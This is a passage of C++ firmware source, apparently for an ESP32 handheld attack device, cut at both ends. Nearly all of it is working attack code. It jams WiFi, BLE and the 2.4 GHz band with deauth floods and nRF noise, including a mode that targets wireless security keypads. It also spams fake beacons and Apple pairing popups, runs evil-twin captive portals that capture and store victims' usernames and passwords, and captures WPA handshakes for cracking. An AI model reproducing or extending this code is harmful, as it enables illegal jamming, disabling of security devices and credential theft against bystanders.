}

// ---------------------------------------------------------------- CHANNEL THIEF (CSA hijack + WiFi+BLE+nRF jam)
static uint8_t  gJamCh = 1;
static uint32_t gJamStartMs = 0;
static bool     gJamWifiUp = false;
static bool     gJamBleUp  = false;

static inline void ggScreenJamPick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Pick target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning WiFi...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Pick target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gJamCh = ggWifiAPs[gSel].channel;
    memcpy(ggWifiDeauthBssid, ggWifiAPs[gSel].bssid, 6);
    ggWifiPickScanEnd();
    ggClickFire();
    ggBack(); ggGo(GS_JAM_RUN);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu("Pick target", p, ggWifiAPCount, gSel, gTop, "SEL=steal this ch");
}

static inline void ggScreenJamRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    // start WiFi probe flood
    gWifiTx.channel = gJamCh;
    gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gJamWifiUp = true;
    // start BLE flood
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gJamBleUp = true;
    // nRF wideband noise across target WiFi channel
    ggFloodNrfStart(gJamCh);
    gJamStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gJamWifiUp)  { ggWifiTxEnd(); gJamWifiUp = false; }
    if (gJamBleUp)   { ggBleFloodMode = false; ggBleTxEnd(); gJamBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  // BLE flood cycling
  if (ggBleFloodMode) ggBleFloodCycle();
  ggFloodNrfPump();
  // hop WiFi across all channels for full-band coverage
  { static uint32_t lastJamHop=0; static uint8_t jamHopCh=1; uint32_t n2=millis();
    if(n2-lastJamHop>=60){ lastJamHop=n2; jamHopCh++; if(jamHopCh>14)jamHopCh=1;
    gWifiTx.channel=jamHopCh; ggWifiTxSetChannel(jamHopCh, gWifiTx); } }
  uint32_t elapsed = (millis()-gJamStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("CH THIEF");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u SWEEPING", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s nRF%u-%u",wf,bf,ggFloodNrfChLo,ggFloodNrfChHi); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- KEYPAD BUSTER
// Sweeps nRF carriers across the full 2.4GHz band while flooding WiFi+BLE.
// Targets wireless keypads that use 2.4GHz (BLE, WiFi, or proprietary).
// nRF modules hop across the band in a fast sweep pattern to cover every freq.
static uint32_t gKpadStartMs = 0;
static bool     gKpadWifiUp = false;
static bool     gKpadBleUp  = false;

static inline void ggScreenKpadRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gKpadWifiUp = true;
    // BLE flood all channels
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gKpadBleUp = true;
    // nRF wideband noise — full 2.4GHz band sweep
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
    if (ggNrfPresentA) ggNrfNoiseBegin(0,0);
    if (ggNrfPresentB) ggNrfNoiseBegin(1,63);
    ggFloodNrfActive = true;
    gKpadStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gKpadWifiUp) { ggWifiTxEnd(); gKpadWifiUp = false; }
    if (gKpadBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gKpadBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  // pump nRF noise + hop channels every call
  ggFloodNrfPump();
  // BLE flood cycling
  if (ggBleFloodMode) ggBleFloodCycle();
  // hop WiFi between ch1, ch6, ch11 every 500ms
  uint32_t now = millis();
  static uint32_t lastWifiHop = 0;
  static uint8_t wifiHopIdx = 0;
  if (now - lastWifiHop >= 100) {
    lastWifiHop = now;
    static const uint8_t wHops[] = {1, 6, 11};
    wifiHopIdx = (wifiHopIdx + 1) % 3;
    gWifiTx.channel = wHops[wifiHopIdx];
    ggWifiTxSetChannel(gWifiTx.channel, gWifiTx);
  }
  uint32_t elapsed = (millis()-gKpadStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("KEYPAD BUST");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.print("2.4G FULL SWEEP");
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s nRF%u+%u",wf,bf,ggFloodNrfPosA,ggFloodNrfPosB); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- RADIUS JAMMER
// Scans for ALL nearby networks, collects unique channels, then floods
// every channel by rapid-hopping. Hits multiple routers simultaneously.
static uint8_t  gRadChans[14];
static uint8_t  gRadChanCount = 0;
static uint32_t gRadStartMs = 0;
static bool     gRadWifiUp = false;
static bool     gRadBleUp  = false;
static uint8_t  gRadHopIdx = 0;

static inline void ggScreenRadPick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Radius scan");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning all APs...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Radius scan");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  // auto-collect unique channels and start
  gRadChanCount = 0;
  for (int i = 0; i < ggWifiAPCount && gRadChanCount < 14; i++) {
    uint8_t ch = ggWifiAPs[i].channel;
    bool dup = false;
    for (int j = 0; j < gRadChanCount; j++) { if (gRadChans[j] == ch) { dup = true; break; } }
    if (!dup) gRadChans[gRadChanCount++] = ch;
  }
  ggWifiPickScanEnd();
  ggClickFire();
  ggBack(); ggGo(GS_RAD_RUN);
}

static inline void ggScreenRadRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = gRadChans[0]; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gRadWifiUp = true;
    // BLE flood
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gRadBleUp = true;
    // nRF wideband noise across full 2.4GHz band
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
    if (ggNrfPresentA) ggNrfNoiseBegin(0,0);
    if (ggNrfPresentB) ggNrfNoiseBegin(1,63);
    ggFloodNrfActive = true;
    gRadHopIdx = 0; gRadStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gRadWifiUp) { ggWifiTxEnd(); gRadWifiUp = false; }
    if (gRadBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gRadBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  ggFloodNrfPump();
  if (ggBleFloodMode) ggBleFloodCycle();
  // hop WiFi flood between ALL found channels
  uint32_t now = millis();
  static uint32_t lastRadHop = 0;
  uint32_t hopMs = (gRadChanCount > 1) ? (120 / gRadChanCount) : 120;
  if (hopMs < 30) hopMs = 30;
  if (now - lastRadHop >= hopMs) {
    lastRadHop = now;
    gRadHopIdx = (gRadHopIdx + 1) % gRadChanCount;
    gWifiTx.channel = gRadChans[gRadHopIdx];
    ggWifiTxSetChannel(gWifiTx.channel, gWifiTx);
  }
  uint32_t elapsed = (millis()-gRadStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("RADIUS JAM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("%uAP %uch FLOOD",ggWifiAPCount,gRadChanCount);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s CH%u",wf,bf,gRadChans[gRadHopIdx]); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- BEACON SPAM
// Floods the air with fake WiFi SSIDs, each carrying a NAV reservation attack.
// Every nearby device's WiFi list fills with phantom networks.
static uint32_t gSpamStartMs = 0;
static inline void ggScreenSpamRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiSpamMode = true;
    ggSpamCount = 0;
    gWifiTx.channel = 1; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gSpamStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  if (gEv.up)   { int v=(int)gWifiTx.channel+1; if(v>14)v=1;  gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  if (gEv.down) { int v=(int)gWifiTx.channel-1; if(v<1)v=14; gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  { static uint32_t sLastHop=0; static uint8_t sHi=0; static const uint8_t sHC[]={1,6,11};
    if(millis()-sLastHop>=500){ sLastHop=millis(); sHi=(sHi+1)%3; gWifiTx.channel=sHC[sHi]; ggWifiTxSetChannel(sHC[sHi],gWifiTx); } }
  uint32_t cnt = ggSpamCount;
  uint32_t elapsed = (millis()-gSpamStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/50;
  ggOled.clearDisplay(); ggHeader("BEACON SPAM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u SSID+NAV", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu SSIDs/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  UP/DN ch");
  ggOled.display();
}

// ---------------------------------------------------------------- BLE SPAM
// Floods nearby phones with fake Apple/Beats device popups via BLE Proximity Pairing.
// Each cycle sends a different device model with a new MAC, triggering "device found
// nearby" notifications on iPhones and other Apple devices.
static uint32_t gBleSpamStartMs = 0;
static inline void ggScreenBleSpamRun() {
#if !GG_ENABLE_BLE_SPAM
  ggBack(); return;
#else
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggBleSpamMode = true;
    ggBleFloodMode = true;
    ggBleSpamCount = 0;
    gBleTx.power = GG_BP_MAX;
    gBleTx.channels = GG_BC_ALL;
    ggBleTxBegin(gBleTx);
    esp_ble_gap_stop_advertising();
    delay(10);
    ggBleSpamSetAny(0);
    delay(20);
    ggBleAdvP.adv_type = (ggBleSpamEffProto == GG_BSP_APPLE) ? ADV_TYPE_NONCONN_IND : ADV_TYPE_IND;
    esp_ble_gap_start_advertising(&ggBleAdvP);
    delay(10);
    gBleSpamStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggBleTxEnd(); ggBack(); return; }
  ggBleSpamCycle();
  uint32_t cnt = ggBleSpamCount;
  uint32_t elapsed = (millis()-gBleSpamStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/20;
  const char* hdr;
  switch (ggBleSpamProto) {
    case GG_BSP_FASTPAIR:  hdr = "FAST PAIR"; break;
    case GG_BSP_SAMSUNG:   hdr = "SAMSUNG"; break;
    case GG_BSP_SWIFTPAIR: hdr = "SWIFT PAIR"; break;
    case GG_BSP_NAMES:     hdr = "NAME FLOOD"; break;
    case GG_BSP_ALL:       hdr = "ALL SPAM"; break;
    default:               hdr = "BLE SPAM"; break;
  }
  ggOled.clearDisplay(); ggHeader(hdr);
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.print(ggBleSpamDevName(cnt & 0xFF));
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu devs/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
#endif // GG_ENABLE_BLE_SPAM
}

// ---------------------------------------------------------------- EVIL TWIN pick
static inline void ggScreenEvilPick() {
#if !GG_ENABLE_PORTAL
  ggBack(); return;
#else
  const char* hdr = (ggPortalType==GG_PT_COFFEE)?"Coffee AP":
                    (ggPortalType==GG_PT_HOTEL) ?"Hotel AP":
                    (ggPortalType==GG_PT_UPDATE)?"Update AP":"Evil Twin";
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader(hdr);
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader(hdr);
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    ggWifiPickScanEnd();
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggClickFire();
    ggPortalBegin(ggWifiAPs[gSel].ssid, ggWifiAPs[gSel].channel);
    ggBack(); ggGo(GS_EVIL_RUN);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu(hdr, p, ggWifiAPCount, gSel, gTop, "SEL=clone & trap");
#endif // GG_ENABLE_PORTAL
}

// ---------------------------------------------------------------- EVIL TWIN run
static uint32_t gEvilStartMs = 0;
static int gEvilLastCred = 0;
static inline void ggScreenEvilRun() {
#if !GG_ENABLE_PORTAL
  ggBack(); return;
#else
  if (!gRunInit) { gEvilStartMs = millis(); gEvilLastCred = 0; gPhase = 0; gRunInit = true; }
  if (gEv.back) { ggPortalEnd(); ggBack(); return; }
  if (gEv.sel && ggCredCount > 0) {
    ggSaveCreds(ggCredStore, ggCredCount);
    ggClickOk();
  }
  if (ggCredCount > gEvilLastCred) { ggClickFire(); gEvilLastCred = ggCredCount; }
  uint32_t elapsed = (millis()-gEvilStartMs)/1000;
  gPhase++;
  const char* ehdr = (ggPortalType==GG_PT_COFFEE)?"COFFEE TRAP":
                     (ggPortalType==GG_PT_HOTEL) ?"HOTEL TRAP":
                     (ggPortalType==GG_PT_UPDATE)?"UPDATE TRAP":"EVIL TWIN";
  ggOled.clearDisplay(); ggHeader(ehdr);
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18);
  char ssidT[16]; snprintf(ssidT,16,"%.15s",ggPortalSsid);
  ggOled.print(ssidT);
  ggOled.setCursor(34,28);
  ggOled.printf("Cli:%u Cred:%u",ggPortalClients,ggCredCount);
  if (ggCredCount > 0) {
    ggOled.setCursor(34,38);
    char lu[13]; snprintf(lu,13,"%.12s",ggCredStore[ggCredCount-1].user);
    ggOled.print(lu);
  }
  ggOled.setCursor(2,45); ggOled.printf("Portal active  %lus",(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(ggCredCount>0?"BACK=stop SEL=save":"BACK=stop  waiting");
  ggOled.display();
#endif // GG_ENABLE_PORTAL
}

// ---------------------------------------------------------------- DRONE DROP
// ---------------------------------------------------------------- PROBE HARVEST
// Passive promiscuous-mode sniffer. Captures probe request SSIDs from nearby
// devices, revealing what WiFi networks they're searching for.
static uint8_t  gProbeCh = 1;
static uint32_t gProbeChLast = 0;

static inline void ggScreenProbeRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggProbeBegin();
    gProbeCh = 1;
    ggProbeSetChannel(gProbeCh);
    gProbeChLast = millis();
    gRunInit = true;
  }
  if (gEv.back) { ggProbeEnd(); ggBack(); return; }
  uint32_t now = millis();
  if (now - gProbeChLast >= 400) {
    gProbeCh++; if (gProbeCh > 14) gProbeCh = 1;
    ggProbeSetChannel(gProbeCh);
    gProbeChLast = now;
  }
  int n = ggProbeN;
  int pt = ggProbeTotal;
  if (n > GG_PROBE_MAX) n = GG_PROBE_MAX;
  if (n > 0) ggMove(0, n - 1);
  ggOled.clearDisplay(); ggHeader("PROBE SNIFF");
  ggOled.setTextColor(SSD1306_WHITE);
  ggOled.setCursor(2, 18);
  ggOled.printf("CH%u N:%d P:%d", gProbeCh, n, pt);
  if (n > 0) {
    int top = 0;
    if (gSel > top + 2) top = gSel - 2;
    if (gSel < top) top = gSel;
    // snapshot visible rows to avoid cross-core tearing
    char snapS[3][22]; uint8_t snapC[3];
    int snapN = 0;
    for (int i = 0; i < 3 && top + i < n; i++) {
      int idx = top + i;
      memcpy(snapS[i], ggProbeSSIDs[idx], 22);
      snapC[i] = ggProbeCounts[idx];
      snapN++;
    }
    for (int i = 0; i < snapN; i++) {
      int idx = top + i;
      int y = 28 + i * 9;
      if (idx == gSel) {
        ggOled.fillRect(0, y - 1, 128, 9, SSD1306_WHITE);
        ggOled.setTextColor(SSD1306_BLACK);
      } else {
        ggOled.setTextColor(SSD1306_WHITE);
      }
      ggOled.setCursor(2, y);
      ggOled.printf("%.15s x%u", snapS[i], snapC[i]);
    }
    ggOled.setTextColor(SSD1306_WHITE);
  } else {
    ggOled.setCursor(2, 35); ggOled.print("Listening...");
  }
  ggOled.drawFastHLine(0, 54, 128, SSD1306_WHITE);
  ggOled.setCursor(2, 56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- SAVED CREDS
static inline void ggScreenCredView() {
#if !GG_ENABLE_PORTAL
  ggBack(); return;
#else
  if (!gRunInit) {
    ggCredCount = ggLoadCreds(ggCredStore, GG_CRED_MAX);
    gRunInit = true;
  }
  if (gEv.back) { ggBack(); return; }
  if (ggCredCount == 0) {
    ggOled.clearDisplay(); ggHeader("Saved Creds");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2, 28); ggOled.print("No creds saved");
    ggOled.setCursor(2, 38); ggOled.print("Use Evil Twin first");
    ggOled.drawFastHLine(0, 54, 128, SSD1306_WHITE);
    ggOled.setCursor(2, 56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggCredCount);
  if (gEv.sel && gSel == ggCredCount) {
    ggClearCreds(); ggCredCount = 0;
    ggClickFire(); return;
  }
  static char rows[GG_CRED_MAX + 1][22]; const char* p[GG_CRED_MAX + 1];
  for (int i = 0; i < ggCredCount; i++) {
    snprintf(rows[i], 22, "%.9s:%.9s", ggCredStore[i].user, ggCredStore[i].pass);
    p[i] = rows[i];
  }
  snprintf(rows[ggCredCount], 22, "[CLEAR ALL]");
  p[ggCredCount] = rows[ggCredCount];
  static char hBuf[22];
  if (gSel < ggCredCount)
    snprintf(hBuf, 22, "%.21s", ggCredStore[gSel].pass);
  else
    snprintf(hBuf, 22, "Delete all saved");
  ggMenu("Saved Creds", p, ggCredCount + 1, gSel, gTop, hBuf);
#endif // GG_ENABLE_PORTAL
}

// ---------------------------------------------------------------- WIFI CRACK pick
static inline void ggScreenCrackPick() {
#if !GG_ENABLE_CRACK
  ggBack(); return;
#else
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("WiFi Crack");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("WiFi Crack");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    GgWifiAP& ap = ggWifiAPs[gSel];
    if (ap.enc < 2 || ap.enc == 5) {
      ggClickBack(); return;
    }
    ggWifiPickScanEnd();
    memcpy(ggHsTargetBssid, ap.bssid, 6);
    ggHsTargetCh = ap.channel;
    strncpy(ggHsTargetSsid, ap.ssid, 32); ggHsTargetSsid[32]='\0';
    ggClickFire();
    ggGo(GS_CRACK_CAP);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  static const char* const ENC_TAG[] = {"OPN","WEP","WPA","WP2","W12","ENT","WP3","W23","WAP"};
  for (int i=0;i<ggWifiAPCount;i++){
    const char* et = (ggWifiAPs[i].enc < 9) ? ENC_TAG[ggWifiAPs[i].enc] : "???";
    snprintf(rows[i],22,"%.7s %s %ddB",ggWifiAPs[i].ssid,et,ggWifiAPs[i].rssi);
    p[i]=rows[i];
  }
  const char* hint = "SEL=crack target";
  GgWifiAP& sel = ggWifiAPs[gSel];
  if (sel.enc < 2 || sel.enc == 5) hint = "Can't crack this type";
  ggMenu("WiFi Crack", p, ggWifiAPCount, gSel, gTop, hint);
#endif // GG_ENABLE_CRACK
}

// ---------------------------------------------------------------- WIFI CRACK capture
static uint32_t gCrackCapStart = 0;
static uint8_t  gCrackCapPhase = 0;
static uint32_t gCrackPhaseMs  = 0;
static bool     gCrackJamUp    = false;
static bool     gCrackTimedOut = false;
#define GG_CRACK_TIMEOUT_S 120
static inline void ggScreenCrackCap() {
#if !GG_ENABLE_CRACK
  ggBack(); return;
#else
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggCrackCaptureBegin(ggHsTargetCh);
    gCrackCapStart = millis();
    gCrackCapPhase = 0;
    gCrackPhaseMs = millis();
    gCrackJamUp = false;
    gCrackTimedOut = false;
    gRunInit = true;
  }
  if (gEv.back) {
    if (gCrackJamUp) { ggFloodNrfStop(); gCrackJamUp=false; }
    ggCrackCaptureEnd();
    ggBack(); return;
  }
  uint32_t capElapsed = (millis() - gCrackCapStart) / 1000;
  if (capElapsed >= GG_CRACK_TIMEOUT_S && !ggHsCaptured) {
    if (gCrackJamUp) { ggFloodNrfStop(); gCrackJamUp=false; }
    ggCrackCaptureEnd();
    gCrackTimedOut = true;
    ggCrackDone = true;
    ggCrackFound = false;
    ggBack(); ggGo(GS_CRACK_DONE);
    return;
  }
  if (ggHsCaptured) {
    if (gCrackJamUp) { ggFloodNrfStop(); gCrackJamUp=false; }
    ggCrackCaptureEnd();
    ggClickFire();
    ggCrackBegin();
    ggBack(); ggGo(GS_CRACK_DONE);
    return;
  }
  uint32_t now = millis();
  uint32_t phaseElapsed = now - gCrackPhaseMs;
  switch (gCrackCapPhase) {
    case 0:
      if (phaseElapsed > 3000) { gCrackCapPhase=1; gCrackPhaseMs=now; }
      break;
    case 1:
      if (ggNrfPresentA || ggNrfPresentB) {
        ggFloodNrfStart(ggHsTargetCh);
        gCrackJamUp = true;
      }
      gCrackCapPhase=2; gCrackPhaseMs=now;
      break;
    case 2:
      ggFloodNrfPump();
      if (phaseElapsed > 3000) { gCrackCapPhase=3; gCrackPhaseMs=now; }
      break;
    case 3:
      if (gCrackJamUp) { ggFloodNrfStop(); gCrackJamUp=false; }
      gCrackCapPhase=4; gCrackPhaseMs=now;
      break;
    case 4:
      if (phaseElapsed > 5000) { gCrackCapPhase=1; gCrackPhaseMs=now; }
      break;
  }
  ggOled.clearDisplay(); ggHeader("HANDSHAKE");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18);
  char ssT[16]; snprintf(ssT,16,"%.15s",ggHsTargetSsid); ggOled.print(ssT);
  ggOled.setCursor(2,27);
  ggOled.printf("CH%u  Data:%lu", ggHsTargetCh, (unsigned long)ggHsDataPkts);
  ggOled.setCursor(2,36);
  ggOled.printf("EAPOL:%lu", (unsigned long)ggHsEapolPkts);
  if (ggHs.gotMsg1) ggOled.print(" Msg1!");
  uint32_t timeLeft = (capElapsed < GG_CRACK_TIMEOUT_S) ? GG_CRACK_TIMEOUT_S - capElapsed : 0;
  ggOled.setCursor(2,45);
